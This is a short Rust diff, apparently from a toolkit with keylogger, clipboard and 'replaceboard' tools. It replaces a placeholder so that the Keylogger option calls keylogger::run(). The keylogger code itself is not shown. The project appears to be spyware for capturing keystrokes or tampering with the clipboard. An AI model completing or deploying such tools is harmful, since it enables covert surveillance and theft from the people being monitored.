@@ -1,5 +1,5 @@
 mod tools;
-use tools::{clipboard, replaceboard, ghost, Tool};
+use tools::{keylogger, clipboard, replaceboard, Tool};
 use std::{
     error::Error,
 };
@@ -48,7 +48,8 @@ pub fn run(tool: Tool) -> Result<(), Box<dyn Error>> {
     match tool {
         Tool::Keylogger => {
             // You can implement the logic for Keylogger here
-            todo!("Please implement me!");
+            let _ = keylogger::run();
+            return Ok(());
         }
         Tool::Clipboard => {
             // You can implement the logic for Clipboard here
